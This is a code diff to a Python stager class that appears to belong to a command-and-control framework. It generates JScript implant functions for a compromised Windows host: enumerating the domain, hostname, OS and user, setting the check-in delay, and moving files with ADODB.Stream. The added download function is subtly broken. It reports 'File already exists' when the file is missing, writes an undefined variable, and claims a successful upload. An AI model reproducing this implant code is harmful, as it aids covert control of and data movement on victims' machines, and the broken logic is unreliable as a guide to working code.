@@ -49,25 +49,34 @@ class JScriptStager(Stager):
     def setup_functions(self):
         self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'function domain(){{return {0}}}'.format(self.variables['domain'][1]))
         self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'function hostname(){{return {0}}}'.format(self.variables['hostname'][1]))
-        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number.', 'function os(){{var productname = {0}; var buildnumber = {1}; return productname + " Build " + buildnumber;}}'.format(self.variables['product-name'][1], self.variables['build-number'][1]))
+        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number', 'function os(){{var productname = {0}; var buildnumber = {1}; return productname + " Build " + buildnumber;}}'.format(self.variables['product-name'][1], self.variables['build-number'][1]))
         self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'function sleep(tmp){{{0} = tmp;}}'.format(self.variables['sleep'][0]))
-        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload local_filename, remote_path).',
-        ('''function upload(filename, path) {{'''
-            '''try {{'''
-                '''var data = {0}({1}, 'binary');'''
-                '''if ({2}.FileExists(path) == true){{'''
-                    '''return 'File already exists.';'''
-                '''}}'''
-                '''var stream = new ActiveXObject("ADODB.Stream");'''
-                '''stream.Open();'''
-                '''stream.Type = 1;'''
-                '''stream.Write(data);'''
-                '''stream.Position = 0;'''
-                '''stream.SaveToFile(path, 2);'''
-                '''stream.Close();'''
-                '''return 'Successfully uploaded the file.';'''
-            '''}} catch (e) {{'''
-                '''return 'Failed to upload the file: ' + e.Message + '.' ;'''
+        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload file:local_filename, "remote_path")',
+        ('''function upload(data, path) {{'''
+            '''if ({2}.FileExists(path) == true){{'''
+                '''return 'File already exists.';'''
             '''}}'''
+            '''var stream = new ActiveXObject("ADODB.Stream");'''
+            '''stream.Open();'''
+            '''stream.Type = 1;'''
+            '''stream.Write(data);'''
+            '''stream.Position = 0;'''
+            '''stream.SaveToFile(path, 2);'''
+            '''stream.Close();'''
+            '''return 'Successfully uploaded ' + path + '.';'''
+        '''}}''').format(self.variables['post-req'][0], ''' '"filename":"' + filename + '"}' ''', self.variables['file-system-object'][0]))
+        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path")',
+        ('''function download(path) {{'''
+            '''if ({2}.FileExists(path) == false){{'''
+                '''return 'File already exists.';'''
+            '''}}'''
+            '''var stream = new ActiveXObject("ADODB.Stream");'''
+            '''stream.Open();'''
+            '''stream.Type = 1;'''
+            '''stream.Write(data);'''
+            '''stream.Position = 0;'''
+            '''stream.SaveToFile(path, 2);'''
+            '''stream.Close();'''
+            '''return 'Successfully uploaded ' + path + '.';'''
         '''}}''').format(self.variables['post-req'][0], ''' '"filename":"' + filename + '"}' ''', self.variables['file-system-object'][0]))
         self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]))
